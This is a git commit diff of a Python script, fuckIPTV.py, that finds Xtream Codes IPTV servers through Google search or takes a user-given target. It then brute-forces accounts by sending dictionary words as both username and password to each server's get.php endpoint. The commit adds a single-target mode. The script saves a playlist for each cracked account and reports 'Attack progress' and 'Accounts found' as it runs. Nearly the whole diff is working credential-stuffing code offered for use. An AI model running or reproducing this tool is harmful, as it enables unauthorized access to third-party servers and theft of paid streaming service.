ba2d75c0223cc3da514e57b715c3a41028584cc7
guarnacciaa <andrea.guarnaccia@gmail.com>
2016-04-27 10:55:19 +0200

    Added dirty code to support single target, it will need proper rewrite

--- fuckIPTV.py
+++ fuckIPTV.py
@@ -20,13 +20,22 @@ parsedUrls = []
 basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
 searchString = "\"Xtream Codes v1.0.60 Copyright 2014-2015\""
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-s', '--servers', help="Number of target servers", required=True)
-parser.add_argument('-l', '--language', help="Preferred language (en, ru, es, ..)", required=True)
+parser = argparse.ArgumentParser(epilog="You must define either a server amount or a target address.")
+parser.add_argument('-l', '--language', help="Preferred language (en, ru, es, ..)")
+parser.add_argument('-s', '--servers', help="Amount of target servers")
+parser.add_argument('-t', '--target', help='Specific target address (i.e.: http://hostname.ext:port')
 args = parser.parse_args()
 
-print "Language          : " + args.language
+if args.servers is None and args.target is None:
+    parser.print_help()
+    sys.exit("\nServer amount/target is missing.") 
     
+if args.servers is not None and args.language is None:
+    parser.print_help()
+    sys.exit("\nYou must specify the language you want to use.") 
+
+
+
 dictionaries = os.listdir(dictDir)
 
 if (len(dictionaries) <= 0):
@@ -34,31 +43,97 @@ if (len(dictionaries) <= 0):
     
 print "Found dictionaries:", len(dictionaries)
 
-print "Looking for", args.servers, "IPTV servers..."
+if args.servers:
+    print "Language          : " + args.language
+    print "Looking for", args.servers, "IPTV server(s)..."
+        
+    # Google Search 
+    for url in google.search(searchString, lang=args.language, num=int(args.servers), stop=1):
+        error = 0
+        found = 0
+        pointer = 1
+        print "=============================================================="
+        print "Found server at: " + url
+        parsed = urlparse(url)
+        newURL = parsed.scheme + "://" + parsed.netloc
+        parsedUrls.append(newURL)
+        
+        print "Scanning: " + newURL + " (this might take a long time, be patient)"
+        
+        for dict in sorted(dictionaries):
+            with open(dictDir + "/" + dict) as f:
+                rows = f.readlines()
+                
+            with open(dictDir + "/" + dict) as g:
+                fileLength = len(g.readlines())
     
-# Google Search 
-counter = 1
-for url in google.search(searchString, lang=args.language, num=int(args.servers), stop=1):
+            print "Using dictionary: " + dict + " (%d words)" % fileLength
+                    
+            
+            for row in rows:
+                progress = float(pointer) / float(fileLength) * 100
+                sys.stdout.write("Attack progress: %d%% (%d/%d) (Accounts found: %d) \r" % (progress, pointer, fileLength, found) )
+                sys.stdout.flush()
+                pointer += 1
+                try:
+                    opener = urllib2.build_opener()
+                    opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+                    response = opener.open(newURL + basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()), timeout = 10)
+                    fetched = response.read()
+                    # IF the fetched content is not empty
+                    # we build the dedicated .m3u file
+                    if len(fetched) > 0:
+                        newPath = outputDir + "/" + args.language + "/" + url.replace("http://", "")
+                        if os.path.exists(newPath) is False:
+                            os.makedirs(newPath)
+                        outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
+                        outputFile.write(fetched)
+                        outputFile.close()            
+                        found += 1
+                        counter += 1
+                except urllib2.HTTPError, e:
+                    print "Ops, HTTPError exception here. Cannot fetch the current URL " + newURL + " (" + str(e.code) + ")"
+                    counter += 1
+                    error += 1
+                    break
+                except urllib2.URLError, e:
+                    print "Ops, the URL seems broken. " + str(e.reason)
+                    counter += 1
+                    error += 1
+                    break
+                except socket.timeout:
+                    print "Ops, socket timeout."
+                    counter += 1
+                    # no need to increase error here as we want to still scan the same server with the next dictionary
+                    break
+            #print newURL + ": all done."
+            parsedUrls.remove(newURL)
+            if (error > 0): 
+                print "[", counter -1, "] Connection error, skipping server..."
+                break; 
+            print "Accounts discovered on " + newURL + ":", found
+
+if args.target:
+    print "Probing address", args.target, "..."
+    
     error = 0
     found = 0
     pointer = 1
-    print "=============================================================="
-    print "[", counter, "] Found server at: " + url
-    parsed = urlparse(url)
-    newURL = parsed.scheme + "://" + parsed.netloc
-    parsedUrls.append(newURL)
-    
-    print "[", counter, "] Scanning: " + newURL + " (this might take a long time, be patient)"
-    
+        
     for dict in sorted(dictionaries):
         with open(dictDir + "/" + dict) as f:
             rows = f.readlines()
             
         with open(dictDir + "/" + dict) as g:
             fileLength = len(g.readlines())
-
-        print "[", counter, "] Using dictionary: " + dict + " (%d words)" % fileLength
-                
+    
+        print "Using dictionary: " + dict + " (%d words)" % fileLength
+        
+        parsed = urlparse(args.target)
+        newURL = parsed.scheme + "://" + parsed.netloc
+        parsedUrls.append(newURL)
+        
+        print "Scanning: " + newURL + " (this might take a long time, be patient)"
         
         for row in rows:
             progress = float(pointer) / float(fileLength) * 100
@@ -73,7 +148,7 @@ for url in google.search(searchString, lang=args.language, num=int(args.servers)
                 # IF the fetched content is not empty
                 # we build the dedicated .m3u file
                 if len(fetched) > 0:
-                    newPath = outputDir + "/" + args.language + "/" + url.replace("http://", "")
+                    newPath = outputDir + "/" + args.language + "/" + args.target.replace("http://", "")
                     if os.path.exists(newPath) is False:
                         os.makedirs(newPath)
                     outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
@@ -82,25 +157,22 @@ for url in google.search(searchString, lang=args.language, num=int(args.servers)
                     found += 1
                     counter += 1
             except urllib2.HTTPError, e:
-                print "[", counter, "] Ops, HTTPError exception here. Cannot fetch the current URL " + newURL + " (" + str(e.code) + ")"
-                counter += 1
+                print "Ops, HTTPError exception here. Cannot fetch the current URL " + newURL + " (" + str(e.code) + ")"
                 error += 1
                 break
             except urllib2.URLError, e:
-                print "[", counter, "] Ops, the URL seems broken. " + str(e.reason)
-                counter += 1
+                print "Ops, the URL seems broken. " + str(e.reason)
                 error += 1
                 break
             except socket.timeout:
-                print "[", counter, "] Ops, socket timeout."
-                counter += 1
+                print "Ops, socket timeout."
                 # no need to increase error here as we want to still scan the same server with the next dictionary
                 break
         #print newURL + ": all done."
         parsedUrls.remove(newURL)
         if (error > 0): 
-            print "[", counter -1, "] Connection error, skipping server..."
+            print "Connection error, skipping server..."
             break; 
-        print "[", counter, "] Accounts discovered on " + newURL + ":", found
-    
+        print "Accounts discovered on " + newURL + ":", found
+            
 print "All done. Enjoy."    
